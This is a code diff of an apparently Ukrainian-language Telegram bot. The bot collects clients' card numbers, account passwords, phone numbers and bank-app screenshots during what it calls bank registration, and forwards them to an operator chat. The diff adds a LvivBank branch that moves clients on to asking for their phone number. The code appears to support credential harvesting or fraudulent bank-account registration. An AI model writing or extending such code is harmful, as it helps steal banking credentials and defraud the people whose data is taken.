@@ -505,7 +505,10 @@ async def process_client_phone(message: Message, state: FSMContext, bot: Bot):
     if client_card:
         anketa_text += f"Номер карти: {client_card}\n\n"
         
-    anketa_text += f"{client_password}"
+    if client_password:
+        anketa_text += f"{client_password}"
+        
+    anketa_text = anketa_text.strip()
     
     from bot.config import ANKETA_CHAT_ID
     target_chat = ANKETA_CHAT_ID or ADMIN_ID
@@ -978,8 +981,9 @@ async def handle_client_photo(message: Message, state: FSMContext, bot: Bot):
         )
         
         if "[SUCCESS_VERIFICATION]" in response:
-            # Перевіряємо, чи це bank.kd
+            # Перевіряємо, чи це bank.kd або LvivBank
             is_bank_kd = current_bank_name and "bank.kd" in current_bank_name.lower()
+            is_lvivbank = current_bank_name and "lviv" in current_bank_name.lower()
 
             # Парсимо маску картки, якщо вона є
             card_first4, card_last4 = None, None
@@ -1001,6 +1005,16 @@ async def handle_client_photo(message: Message, state: FSMContext, bot: Bot):
                 await state.update_data(success_photo_id=photo.file_id)
                 await db.update_session_verification_data(client_id, success_photo_id=photo.file_id, card_first4=card_first4, card_last4=card_last4)
                 await state.set_state(RegistrationStates.waiting_card_screenshot)
+                return
+            elif is_lvivbank:
+                success_text = (
+                    f"Чудово {bank_label} успішно зареєстрували.\n\n"
+                    f"Будь ласка, напишіть Ваш номер телефону?"
+                )
+                await message.answer(success_text, reply_markup=ReplyKeyboardRemove())
+                await state.update_data(success_photo_id=photo.file_id)
+                await db.update_session_verification_data(client_id, success_photo_id=photo.file_id, card_first4=card_first4, card_last4=card_last4)
+                await state.set_state(RegistrationStates.waiting_phone)
                 return
             else:
                 success_text = (
